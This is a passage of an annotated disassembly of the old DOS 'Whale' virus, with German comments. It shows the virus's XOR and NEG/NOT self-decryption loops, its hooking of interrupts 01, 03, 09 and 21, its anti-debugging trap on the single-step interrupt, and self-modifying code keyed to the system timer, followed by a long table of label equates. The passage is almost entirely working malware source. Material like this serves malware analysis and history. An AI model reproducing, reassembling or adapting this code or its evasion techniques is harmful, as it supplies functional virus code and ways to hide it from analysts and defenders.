    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;490E E8 78 00
    DB  1BH             ;4911 1B
    POPF                    ;4912 9D
    POP AX              ;4913 58
    POP BP              ;4914 5D
    JMP DWORD PTR   CS:L2435    ;4915 2E FF 2E 35 24

    DB  0               ;491A 00
                        ;L491B    L2B88 CJ  L3243 CJ
L491B:  PUSHF                   ;491B 9C
    POP CS:L258E            ;491C 2E 8F 06 8E 25
    MOV CS:L2560,AX         ;4921 2E A3 60 25
    MOV CS:L2562,BX         ;4925 2E 89 1E 62 25
    MOV CS:L2564,CX         ;492A 2E 89 0E 64 25
    POP BX              ;492F 5B
    MOV AX,CS:[BX]          ;4930 2E 8B 07
    ADD BX,2                ;4933 83 C3 02
    PUSH    BX              ;4936 53
    MOV CX,AX               ;4937 89 C1
    XOR CH,CH               ;4939 32 ED
                        ;L493B    L493F CJ
L493B:  XOR CS:[BX],AH          ;493B 2E 30 27
                        ;L493D    L3A46 DI
L493D   EQU $-1
    INC BX              ;493E 43
    LOOP    L493B               ;493F E2 FA
    MOV AX,CS:L2560         ;4941 2E A1 60 25
    MOV BX,CS:L2562         ;4945 2E 8B 1E 62 25
    MOV CX,CS:L2564         ;494A 2E 8B 0E 64 25
    PUSH    CS:L258E            ;494F 2E FF 36 8E 25
    POPF                    ;4954 9D
    RET_NEAR                ;4955 C3

                        ;L4956    L2AC9 CC
;   smash code 2aa8-2acb
L4956:  MOV BP,AX               ;4956 89 C5
                        ;L4958    L495C CJ
L4958:  IN  AL,40               ;4958 E4 40
    OR  AL,AL               ;495A 0A C0
    JZ  L4958               ;495C 74 FA
    POP BX              ;495E 5B
    PUSH    BX              ;495F 53
    MOV CX,24   ;'$'            ;4960 B9 24 00
    SUB BX,CX               ;4963 29 CB
                        ;L4965    L4969 CJ
L4965:  XOR CS:[BX],AL          ;4965 2E 30 07
    INC BX              ;4968 43
    LOOP    L4965               ;4969 E2 FA
    CALL    L496E           ;false xor nach 497f , 78 -> e6 
                        ;496B E8 00 00
                        ;L496E    L496B CC
;   false xor nach 497f , 78 -> e6
L496E:  POP BX              ;496E 5B
    ADD BX,14               ;496F 83 C3 14
    MOV CS:[BX],AL          ;4972 2E 88 07
    MOV AX,BP               ;4975 89 E8
    RET_NEAR                ;4977 C3

                        ;L4978    L2AA5 CC
;   decode 24h Byte von 2aa8-2acb
L4978:  MOV BP,AX               ;4978 89 C5
    POP BX              ;497A 5B
    PUSH    BX              ;497B 53
    MOV CX,24   ;'$'            ;497C B9 24 00
                        ;L497F    L4984 CJ
L497F:  XOR BYTE PTR CS:[BX],78 ;'x'    ;497F 2E 80 37 78
    INC BX              ;4983 43
    LOOP    L497F               ;4984 E2 F9
    MOV AX,BP               ;4986 89 E8
    RET_NEAR                ;4988 C3

                        ;L4989    L2901 CC  L2940 CC  L297A CC  L29BC CC  L29FB CC  L2A29 CC  L2A46 CC
                        ;     L2B1F CC  L2B7E CC  L2BB1 CC  L2BCD CC  L2C00 CC  L2C2C CC  L2C4F CC
                        ;     L2C67 CC  L2C86 CC  L2CB4 CC  L2CD3 CC  L2D13 CC  L2D3D CC  L2D76 CC
                        ;     L2DA0 CC  L2E9B CC  L2EBB CC  L2EE7 CC  L2EFD CC  L2F74 CC  L2F93 CC
                        ;     L3040 CC  L310C CC  L313F CC  L317C CC  L31A1 CC  L31E3 CC  L3208 CC
                        ;     L323B CC  L32B2 CC  L32FF CC  L3345 CC  L3415 CC  L3441 CC  L34A6 CC
                        ;     L35BF CC  L3632 CC  L366A CC  L3722 CC  L375F CC  L378C CC  L37FA CC
                        ;     L3866 CC  L38C8 CC  L3911 CC  L396D CC  L3989 CC  L39BE CC  L39E8 CC
                        ;     L3A08 CC  L3A3C CC  L3A7F CC  L438D CC  L439D CC  L43CF CC  L4408 CC
                        ;     L4437 CC  L4448 CC  L445A CC  L4486 CC  L4515 CC  L4536 CC  L4562 CC
                        ;     L4586 CC  L45C9 CC  L46AB CC  L46D4 CC  L46FD CC  L4779 CC  L4796 CC
                        ;     L47C9 CC  L4817 CC  L4881 CC  L48C7 CC  L48EC CC  L490E CC  L4A97 CC
                        ;     L4AEA CC  L4B76 CC
;   jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e
L4989:  PUSHF                   ;4989 9C
    POP CS:L258E            ;498A 2E 8F 06 8E 25
    MOV CS:L2560,AX         ;498F 2E A3 60 25
    MOV CS:L2562,BX         ;4993 2E 89 1E 62 25
    MOV CS:L2564,CX         ;4998 2E 89 0E 64 25
    POP BX              ;499D 5B
    MOV CL,CS:[BX]          ;499E 2E 8A 0F
    XOR CH,CH               ;49A1 32 ED
    INC BX              ;49A3 43
    PUSH    BX              ;49A4 53
    MOV AX,1                ;49A5 B8 01 00
    ADD AX,CX               ;49A8 03 C1
    SUB BX,AX               ;49AA 29 C3
                        ;L49AC    L49B0 CJ
L49AC:  IN  AL,40               ;49AC E4 40
    OR  AL,AL               ;49AE 0A C0
    JZ  L49AC               ;49B0 74 FA
    MOV CX,CS:[BX]          ;49B2 2E 8B 0F
    XOR CH,CH               ;49B5 32 ED
    INC BX              ;49B7 43
    MOV CS:[BX],AL          ;49B8 2E 88 07
                        ;L49BB    L49BF CJ
L49BB:  INC BX              ;49BB 43
    XOR CS:[BX],AL          ;49BC 2E 30 07
    LOOP    L49BB               ;49BF E2 FA
    MOV AX,CS:L2560         ;49C1 2E A1 60 25
    MOV BX,CS:L2562         ;49C5 2E 8B 1E 62 25
    MOV CX,CS:L2564         ;49CA 2E 8B 0E 64 25
    PUSH    CS:L258E            ;49CF 2E FF 36 8E 25
    POPF                    ;49D4 9D
    RET_NEAR                ;49D5 C3

    PUSH    BP              ;49D6 55
    MOV BP,SP               ;49D7 89 E5
    PUSH    AX              ;49D9 50
    CMP WORD PTR [BP+4],OFFSET LC000    ;49DA 81 7E 04 00 C0
    JNB L49ED               ;49DF 73 0C
    MOV AX,CS:L2447         ;49E1 2E A1 47 24
    CMP [BP+4],AX           ;49E5 39 46 04
    JBE L49ED               ;49E8 76 03
                        ;L49EA    L4A19 CJ  L4A20 CJ
;   end of new Int 01
L49EA:  POP AX              ;49EA 58
    POP BP              ;49EB 5D
    IRET                    ;49EC CF

                        ;L49ED    L49DF CJ  L49E8 CJ
L49ED:  CMP BYTE PTR CS:L2450,1     ;49ED 2E 80 3E 50 24 01
    JZ  L4A1B               ;49F3 74 26
    MOV AX,[BP+4]           ;49F5 8B 46 04
    MOV CS:L242F,AX         ;49F8 2E A3 2F 24
    MOV AX,[BP+2]           ;49FC 8B 46 02
    MOV CS:L242D,AX         ;49FF 2E A3 2D 24
    JB  L4A14               ;4A03 72 0F
    POP AX              ;4A05 58
    POP BP              ;4A06 5D
    MOV SP,CS:L24DF         ;4A07 2E 8B 26 DF 24
    MOV SS,CS:L24DD         ;4A0C 2E 8E 16 DD 24
    JMP L488D               ;4A11 E9 79 FE

                        ;L4A14    L4A03 CJ
L4A14:  AND WORD PTR [BP+6],OFFSET LFEFF    ;4A14 81 66 06 FF FE
    JMP SHORT   L49EA       ;end of new Int 01  ;4A19 EB CF

                        ;L4A1B    L49F3 CJ
L4A1B:  DEC BYTE PTR CS:L2451       ;4A1B 2E FE 0E 51 24
    JNZ L49EA           ;end of new Int 01  ;4A20 75 C8
    AND WORD PTR [BP+6],OFFSET LFEFF    ;4A22 81 66 06 FF FE
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;4A27 E8 61 E2
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;4A2A E8 0F E2
    IN  AL,40               ;4A2D E4 40
    MOV CS:L224E,AL         ;4A2F 2E A2 4E 22
    MOV CS:L2269,AL         ;4A33 2E A2 69 22
    MOV AL,3                ;4A37 B0 03
    CALL    L2CB9           ;get Int (AL) into es:bx    
                        ;4A39 E8 7D E2
    PUSH    ES              ;4A3C 06
    POP DS              ;4A3D 1F
    MOV DX,BX               ;4A3E 89 DA
    MOV AL,1                ;4A40 B0 01
    CALL    L2C6C           ;set Int (AL) to ds:dx  ;4A42 E8 27 E2
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;4A45 E8 72 E1
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;4A48 E8 C4 E1
    CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;4A4B E8 89 E1
    CALL    L3186           ;restauriere Int 02 (NMI) auf [2594]:[2592] (Original)  
                        ;4A4E E8 35 E7
    POP AX              ;4A51 58
    POP BP              ;4A52 5D
    PUSH    BX              ;4A53 53
    PUSH    CX              ;4A54 51
    MOV BX,OFFSET L239C         ;4A55 BB 9C 23
    MOV CX,54   ;'T'            ;4A58 B9 54 00
                        ;L4A5B    L4A60 CJ
L4A5B:  XOR BYTE PTR CS:[BX],86     ;4A5B 2E 80 37 86
    INC BX              ;4A5F 43
    LOOP    L4A5B               ;4A60 E2 F9
    POP CX              ;4A62 59
    POP BX              ;4A63 5B
    IRET                    ;4A64 CF

    DB  0EBH                ;4A65 EB
    OR  BYTE PTR CS:L239C,0     ;4A66 2E 80 0E 9C 23 00
    JZ  L4A7F               ;4A6C 74 11
    PUSH    BX              ;4A6E 53
    PUSH    CX              ;4A6F 51
    MOV BX,OFFSET L239C         ;4A70 BB 9C 23
    MOV CX,54   ;'T'            ;4A73 B9 54 00
                        ;L4A76    L4A7B CJ
;   decode part int21
L4A76:  XOR BYTE PTR CS:[BX],86     ;4A76 2E 80 37 86
    INC BX              ;4A7A 43
    LOOP    L4A76           ;decode part int21  ;4A7B E2 F9
    POP CX              ;4A7D 59
    POP BX              ;4A7E 5B
                        ;L4A7F    L4A6C CJ
L4A7F:  JMP L458D           ;Int 03 auf cs:1d0a+2810 -> 451a verbiegen und aufrufen 
                        ;4A7F E9 0B FB

    DB  34              ;4A82 34
    CALL    L3243           ;decode_code    ;4A83 E8 BD E7
    DW  LF213               ;4A86 13 F2
    CALL    L4AC7           ;Int 09 patchen auf jmp cs:2273 [2573]:[2571]   
                        ;4A88 E8 3C 00
    CALL    L4AEF               ;4A8B E8 61 00
    PUSHF                   ;4A8E 9C
    CALL    DWORD PTR   CS:L2583    ;4A8F 2E FF 1E 83 25
    CALL    L4AC7           ;Int 09 patchen auf jmp cs:2273 [2573]:[2571]   
                        ;4A94 E8 30 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4A97 E8 EF FE
    DB  14              ;4A9A 14
    IRET                    ;4A9B CF

    DB  0BC             ;4A9C BC
                        ;L4A9D    L458D CC  L4ACC CC  L4B5E CC
;   Register sichern (Feld)
L4A9D:  MOV CS:L2575,SI         ;4A9D 2E 89 36 75 25
    MOV CS:L2577,DI         ;4AA2 2E 89 3E 77 25
    MOV CS:L257B,DS         ;4AA7 2E 8C 1E 7B 25
    MOV CS:L257D,ES         ;4AAC 2E 8C 06 7D 25
    MOV CS:L2579,AX         ;4AB1 2E A3 79 25
    MOV CS:L257F,CX         ;4AB5 2E 89 0E 7F 25
    MOV CS:L2581,BX         ;4ABA 2E 89 1E 81 25
    MOV CS:L2590,DX         ;4ABF 2E 89 16 90 25
    RET_NEAR                ;4AC4 C3

    DW  L01E8               ;4AC5 E8 01
                        ;L4AC7    L296F CC  L4A88 CC  L4A94 CC
;   Int 09 patchen auf jmp cs:2273 [2573]:[2571]
L4AC7:  CALL    L3243           ;decode_code    ;4AC7 E8 79 E7
    DW  LF822               ;4ACA 22 F8
    CALL    L4A9D           ;Register sichern (Feld)    
                        ;4ACC E8 CE FF
    MOV SI,OFFSET L2570 ;'%p'       ;4ACF BE 70 25
    LES BH,DWORD PTR CS:L2583       ;4AD2 2E C4 3E 83 25
    PUSH    CS              ;4AD7 0E
    POP DS              ;4AD8 1F
    CLD                 ;4AD9 FC
    MOV CX,5                ;4ADA B9 05 00
                        ;L4ADD    L4AE5 CJ
L4ADD:  LODSB                   ;4ADD AC
    XCHG    AL,ES:[DI]          ;4ADE 26 86 05
    MOV [SI-1],AL           ;4AE1 88 44 FF
    INC DI              ;4AE4 47
    LOOP    L4ADD               ;4AE5 E2 F6
    CALL    L4B84           ;Register restaurieren (Feld)   
                        ;4AE7 E8 9A 00
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4AEA E8 9C FE
    DB  23              ;4AED 23
    RET_NEAR                ;4AEE C3

                        ;L4AEF    L340F CC  L4A8B CC
L4AEF:  CALL    L3243           ;decode_code    ;4AEF E8 51 E7
    DW  L3A86               ;4AF2 86 3A
    MOV CS:L2581,BX         ;4AF4 2E 89 1E 81 25
    MOV CS:L257D,ES         ;4AF9 2E 8C 06 7D 25
    XOR BX,BX               ;4AFE 33 DB
    MOV ES,BX               ;4B00 8E C3
                        ;L4B01    L32A5 DI
L4B01   EQU $-1
    MOV BX,ES:6             ;4B02 26 8B 1E 06 00
    CMP BX,CS:L2447         ;4B07 2E 3B 1E 47 24
    JNB L4B27               ;4B0C 73 19
    MOV BX,ES:0E            ;4B0E 26 8B 1E 0E 00
    CMP BX,CS:L2447         ;4B13 2E 3B 1E 47 24
    JNB L4B27               ;4B18 73 0D
    MOV ES,CS:L257D         ;4B1A 2E 8E 06 7D 25
    MOV BX,CS:L2581         ;4B1F 2E 8B 1E 81 25
    JMP L4B76               ;4B24 E9 4F 00

                        ;L4B27    L4B0C CJ  L4B18 CJ
L4B27:  POP BX              ;4B27 5B
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;4B28 E8 11 E1
    CALL    L2C0F           ;Int 21 patchen auf jmp cs:2256 [244c]:[244e] / repatchen   
                        ;4B2B E8 E1 E0
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;4B2E E8 89 E0
    MOV BX,CS:L2581         ;4B31 2E 8B 1E 81 25
    MOV ES,CS:L257D         ;4B36 2E 8E 06 7D 25
    PUSHF                   ;4B3B 9C
    CALL    DWORD PTR   CS:L2583    ;4B3C 2E FF 1E 83 25
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;4B41 E8 F8 E0
    MOV AH,51   ;'Q'            ;4B44 B4 51
    CALL    WORD PTR CS:L2566       ;4B46 2E FF 16 66 25
    MOV ES,BX               ;4B4B 8E C3
    MOV WORD PTR ES:0C,0FFFF        ;4B4D 26 C7 06 0C 00 FF FF
    MOV WORD PTR ES:0A,0        ;4B54 26 C7 06 0A 00 00 00
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;4B5B E8 5C E0
    CALL    L4A9D           ;Register sichern (Feld)    
                        ;4B5E E8 3C FF
    MOV CX,OFFSET L1185         ;4B61 B9 85 11
    MOV BX,4F   ;'O'            ;4B64 BB 4F 00
    MOV AX,OFFSET L0802         ;4B67 B8 02 08
                        ;L4B6A    L4B70 CJ
L4B6A:  OR  CS:[BX],AX          ;4B6A 2E 09 07
    ADD BX,2                ;4B6D 83 C3 02
    LOOP    L4B6A               ;4B70 E2 F8
    CALL    L4B84           ;Register restaurieren (Feld)   
                        ;4B72 E8 0F 00
    IRET                    ;4B75 CF

                        ;L4B76    L4B24 CJ
L4B76:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;4B76 E8 10 FE
    DB  87              ;4B79 87
    RET_NEAR                ;4B7A C3

    DB  0E8             ;4B7B E8
                        ;L4B7C    L482B CJ  L4B81 CJ
L4B7C:  OR  BYTE PTR CS:[BX],15     ;4B7C 2E 80 0F 15
    INC BX              ;4B80 43
    LOOP    L4B7C               ;4B81 E2 F9
    RET_FAR                 ;4B83 CB

                        ;L4B84    L44C8 CC  L4AE7 CC  L4B72 CC
;   Register restaurieren (Feld)
L4B84:  MOV AX,CS:L2579         ;4B84 2E A1 79 25
    MOV ES,CS:L257D         ;4B88 2E 8E 06 7D 25
    MOV DS,CS:L257B         ;4B8D 2E 8E 1E 7B 25
    MOV SI,CS:L2575         ;4B92 2E 8B 36 75 25
    MOV DI,CS:L2577         ;4B97 2E 8B 3E 77 25
    MOV CX,CS:L257F         ;4B9C 2E 8B 0E 7F 25
    MOV BX,CS:L2581         ;4BA1 2E 8B 1E 81 25
    MOV DX,CS:L2590         ;4BA6 2E 8B 16 90 25
    RET_NEAR                ;4BAB C3

    DB  0               ;4BAC 00
                        ;L4BAD    L3880 CC
;   codiere gesamten code bis inkl. 4bb5
L4BAD:  PUSH    CX              ;4BAD 51
    PUSH    BX              ;4BAE 53
    MOV BX,20   ;' '            ;4BAF BB 20 00
    MOV CX,OFFSET L2385         ;4BB2 B9 85 23
                        ;L4BB5    L4BBA CJ
L4BB5:  NEG BYTE PTR [BX]           ;4BB5 F6 1F
    NOT BYTE PTR [BX]           ;4BB7 F6 17
    INC BX              ;4BB9 43
    LOOP    L4BB5               ;4BBA E2 F9
    POP CX              ;4BBC 59
    POP BX              ;4BBD 5B
    XCHG    CX,BX               ;4BBE 87 CB
    CALL    L4D78               ;4BC0 E8 B5 01
    JMP SHORT   L4BCC           ;4BC3 EB 07

                        ;L4BC5    L4BCC CJ
L4BC5:  MOV AX,CS               ;4BC5 8C C8
    MOV DS,AX               ;4BC7 8E D8
    CALL    START           ;Anfang des whale virus, decoding   
                        ;4BC9 E8 02 00
                        ;L4BCC    L0100 CJ  L2811 CJ  L4BC3 CJ
L4BCC:  JMP SHORT   L4BC5           ;4BCC EB F7

                        ;L4BCE    L4BC9 CC
;   Anfang des whale virus, decoding
START:  POP AX              ;4BCE 58
    SUB AX,OFFSET L239C         ;4BCF 2D 9C 23
    XCHG    BX,AX               ;4BD2 93
    MOV CX,OFFSET LDE2E         ;4BD3 B9 2E DE
    XOR CX,OFFSET LFDAB         ;4BD6 81 F1 AB FD
                        ;L4BDA    L4BDF CJ
;   decrypt schleife
DECODE: NOT BYTE PTR [BX]           ;4BDA F6 17
    NEG BYTE PTR [BX]           ;4BDC F6 1F
    INC BX              ;4BDE 43
    LOOP    DECODE          ;decrypt schleife   ;4BDF E2 F9
    MOV AL,8E               ;4BE1 B0 8E
    XLAT                    ;4BE3 D7
    CMP AL,1                ;4BE4 3C 01
    JZ  L4BFB               ;4BE6 74 13
    MOV AX,ES               ;4BE8 8C C0
    MOV BX,AX               ;4BEA 8B D8
    PUSH    DS              ;4BEC 1E
    MOV DS,BX               ;4BED 8E DB
    POP BX              ;4BEF 5B
    SUB AX,AX               ;4BF0 2B C0
    JMP L2831               ;4BF2 E9 3C DC

    ADD CX,[BX+DI+LA5EF]        ;4BF5 03 89 EF A5
    ADC AL,0CC              ;4BF9 14 CC
                        ;L4BFB    L4BE6 CJ
L4BFB:  RET_NEAR                ;4BFB C3

    ADC CX,AX               ;4BFC 11 C1
    ESC 37,[SI]             ;4BFE DE 3C
    MOV AH,2E   ;'.'            ;4C00 B4 2E
    ADD AL,[BX+SI]          ;4C02 02 00
    ADD [BX+SI],AL          ;4C04 00 00
    POP DS              ;4C06 1F
    ADD [BX+SI],AL          ;4C07 00 00
    ADD [BX+7A],BL          ;4C09 00 5F 7A
    ADC AL,[BX+SI]          ;4C0C 12 00
    DB  0F  ??          ;4C0E 0F
    POP DI              ;4C0F 5F
                        ;L4D5A    L3670 DI
L4D5A   EQU $+14A
                        ;L4D78    L4BC0 CC
L4D78   EQU $+168
                        ;L4F1A    L2814 CJ
L4F1A   EQU $+30A
                        ;L5027    L3647 DI
L5027   EQU $+417
                        ;L5057    L461F DI
L5057   EQU $+447
                        ;L51F1    L35C9 DI
L51F1   EQU $+5E1
                        ;L5300    L2F55 DI
L5300   EQU $+6F0
                        ;L5348    L2F88 DI  L3436 DI  L371A DI  L3759 DI
L5348   EQU $+738
                        ;L5519    L2C71 DI
L5519   EQU $+909
                        ;L5601    L40DA DI
L5601   EQU $+9F1
                        ;L561B    L2B9A DI
L561B   EQU $+0A0BH
                        ;L5689    L2F12 DI
L5689   EQU $+0A79
                        ;L5700    L3797 DI  L4478 DI
L5700   EQU $+0AF0
                        ;L5701    L38AC DI
L5701   EQU $+0AF1
                        ;L58EA    L28B3 DI
L58EA   EQU $+0CDA
                        ;L5901    L28A3 DI
L5901   EQU $+0CF1
                        ;L5A4D    L3664 DI
L5A4D   EQU $+0E3DH
                        ;L5B9A    L4658 DM
L5B9A   EQU $+0F8A
                        ;L5CDB    L464A CC
L5CDB   EQU $+10CBH
                        ;L600F    L3230 DI
L600F   EQU $+13FF
                        ;L6011    L2EAE DI
L6011   EQU $+1401
                        ;L6412    L4578 DI
L6412   EQU $+1802
                        ;L6466    L3804 DI
L6466   EQU $+1856
                        ;L64B4    L36C9 CC
L64B4   EQU $+18A4
                        ;L6732    L357C DW  L3583 DR
L6732   EQU $+1B22
                        ;L7020    L4371 DI
L7020   EQU $+2410
                        ;L732C    L30E4 DI
L732C   EQU $+271C
                        ;L742C    L3737 DI
L742C   EQU $+281C
                        ;L74E0    L34CD CJ
L74E0   EQU $+28D0
                        ;L758B    L3059 DI
L758B   EQU $+297BH
                        ;L77E9    L45D7 DI
L77E9   EQU $+2BD9
                        ;L7829    L30AA DI
L7829   EQU $+2C19
                        ;L7D18    L4617 DI
L7D18   EQU $+3108
                        ;L7DB5    L4664 DM
L7DB5   EQU $+31A5
                        ;L801E    L441D DI
L801E   EQU $+340E
                        ;L8025    L376B DI
L8025   EQU $+3415
                        ;L805A    L2B28 DI
L805A   EQU $+344A
                        ;L832E    L32BC DI
L832E   EQU $+371E
                        ;L8418    L342D DI
L8418   EQU $+3808
                        ;L8423    L3D9E DI
L8423   EQU $+3813
                        ;L8651    L3556 DI
L8651   EQU $+3A41
                        ;L872D    L30A1 DI
L872D   EQU $+3B1DH
                        ;L8902    L2F14 DI
L8902   EQU $+3CF2
                        ;L892D    L389F DI
L892D   EQU $+3D1DH
                        ;L8934    L40E2 DI
L8934   EQU $+3D24
                        ;L8A46    L47D5 DI
L8A46   EQU $+3E36
                        ;L8B2E    L288D DI
L8B2E   EQU $+3F1E
                        ;L8F2E    L285C DI
L8F2E   EQU $+431E
                        ;L9023    L43E9 DI
L9023   EQU $+4413
                        ;L940C    L2EF5 DI
L940C   EQU $+47FC
                        ;L9E49    L2FFB DI
L9E49   EQU $+5239
                        ;LA025    L4465 DI
LA025   EQU $+5415
                        ;LA09F    L308F DI
LA09F   EQU $+548F
                        ;LA2E9    L2F40 DI
LA2E9   EQU $+56D9
                        ;LA512    L4528 DI
LA512   EQU $+5902
                        ;LA51A    L48F8 DI
LA51A   EQU $+590A
                        ;LA5EF    L3D24 DR  L4BF5 DR
LA5EF   EQU $+59DF
                        ;LA820    L2D84 DI
LA820   EQU $+5C10
                        ;LA8E9    L2FCB DI
LA8E9   EQU $+5CD9
                        ;LA923    L399F DI
LA923   EQU $+5D13
                        ;LA978    L464A CC
LA978   EQU $+5D68
                        ;LAA2D    L3944 DI
LAA2D   EQU $+5E1DH
                        ;LAB0E    L2C5D DI
LAB0E   EQU $+5EFE
                        ;LABBB    L2A80 DI
LABBB   EQU $+5FABH
                        ;LABBF    L2A9B DI
LABBF   EQU $+5FAF
                        ;LABEF    L2A86 DI
LABEF   EQU $+5FDF
                        ;LACF1    L2DAE DI
LACF1   EQU $+60E1
                        ;LB30E    L32BE DI
LB30E   EQU $+66FE
                        ;LB3BD    L36DF CJ
LB3BD   EQU $+67ADH
                        ;LB512    L2C41 DI
LB512   EQU $+6902
                        ;LB5A2    L465E DW
LB5A2   EQU $+6992
                        ;LB819    L2CBE DI
LB819   EQU $+6C09
                        ;LBB23    L2B00 DI
LBB23   EQU $+6F13
                        ;LBDAB    L3687 DI
LBDAB   EQU $+719BH
                        ;LC000    L49DA DI
LC000   EQU $+73F0
                        ;LC037    L35FF DI
LC037   EQU $+7427
                        ;LC03A    L290A DI
LC03A   EQU $+742A
                        ;LC1FE    L42D3 DR
LC1FE   EQU $+75EE
                        ;LC239    L29C6 DI
LC239   EQU $+7629
                        ;LC311    L3BAE DI  L3BF9 DI
LC311   EQU $+7701
                        ;LC353    L3255 DI
LC353   EQU $+7743
                        ;LC42E    L2992 DI
LC42E   EQU $+781E
                        ;LC5E6    L464F DI
LC5E6   EQU $+79D6
                        ;LC622    L3704 DI
LC622   EQU $+7A12
                        ;LC6E9    L2F3E DI
LC6E9   EQU $+7AD9
                        ;LC9FE    L4287 DR
LC9FE   EQU $+7DEE
                        ;LCEFA    L3565 DI
LCEFA   EQU $-7D16
                        ;LD61C    L2C14 DI
LD61C   EQU $-75F4
                        ;LD80C    L4452 DI
LD80C   EQU $-7404
                        ;LD811    L47BC DI
LD811   EQU $-73FF
                        ;LDC61    L3B3C DI  L3B88 DI  L4000 DI
LDC61   EQU $-6FAF
                        ;LDC68    L3796 DI
LDC68   EQU $-6FA8
                        ;LDD61    L3FB3 DI
LDD61   EQU $-6EAF
                        ;LDE2E    L3D02 DI  L4BD3 DI
LDE2E   EQU $-6DE2
                        ;LDE39    L4892 DI
LDE39   EQU $-6DD7
                        ;LDFDF    L39F4 DI
LDFDF   EQU $-6C31
                        ;LE137    L3312 DI
LE137   EQU $-6AD9
                        ;LE413    L31F9 DI
LE413   EQU $-67FDH
                        ;LE41D    L43B6 DI
LE41D   EQU $-67F3
                        ;LE61E    L48D2 DI
LE61E   EQU $-65F2
                        ;LE80C    L3BC8 DR
LE80C   EQU $-6404
                        ;LE824    L31C3 DI
LE824   EQU $-63EC
                        ;LE857    L2F55 DI
LE857   EQU $-63B9
                        ;LE91D    L46E4 DI
LE91D   EQU $-62F3
                        ;LEA09    L2FCB DI
LEA09   EQU $-6207
                        ;LEB05    L2F40 DI
LEB05   EQU $-610BH
                        ;LEB0A    L4442 DI
LEB0A   EQU $-6106
                        ;LEBA4    L28AB DI
LEBA4   EQU $-606C
                        ;LEF15    L28B6 DI  L3870 DI  L388F DI
LEF15   EQU $-5CFBH
                        ;LEFBF    L2A8A DI
LEFBF   EQU $-5C51
                        ;LEFEB    L2A91 DI
LEFEB   EQU $-5C25
                        ;LF00B    L2D6F DI
LF00B   EQU $-5C05
                        ;LF017    L2A33 DI
LF017   EQU $-5BF9
                        ;LF213    L4A88 DI
LF213   EQU $-59FDH
                        ;LF2FD    L3587 CJ
LF2FD   EQU $-5913
                        ;LF335    L314B DI
LF335   EQU $-58DBH
                        ;LF346    L2AE5 DI
LF346   EQU $-58CA
                        ;LF35F    L28AB DI
LF35F   EQU $-58B1
                        ;LF4F4    L33F8 CI
LF4F4   EQU $-571C
                        ;LF60C    L2EDF DI
LF60C   EQU $-5604
                        ;LF627    L2A06 DI
LF627   EQU $-55E9
                        ;LF80E    L397F DI
LF80E   EQU $-5402
                        ;LF822    L4ACC DI
LF822   EQU $-53EE
                        ;LFB88    L2F33 DI
LFB88   EQU $-5088
                        ;LFC0A    L4397 DI
LFC0A   EQU $-5006
                        ;LFDAB    L3D05 DI  L4BD6 DI
LFDAB   EQU $-4E65
                        ;LFE5C    L4721 DI
LFE5C   EQU $-4DB4
                        ;LFEFF    L291A DI  L2A6A DI  L4A14 DI  L4A22 DI
LFEFF   EQU $-4D11
                        ;LFF02    L289F DI
LFF02   EQU $-4D0E
                        ;LFF2E    L28A5 DI
LFF2E   EQU $-4CE2
                        ;LFF72    L3B0C DI
LFF72   EQU $-4C9E
                        ;LFFF0    L301A DI  L37EE DI
LFFF0   EQU $-4C20
    S0000   ENDS
;
END L0100
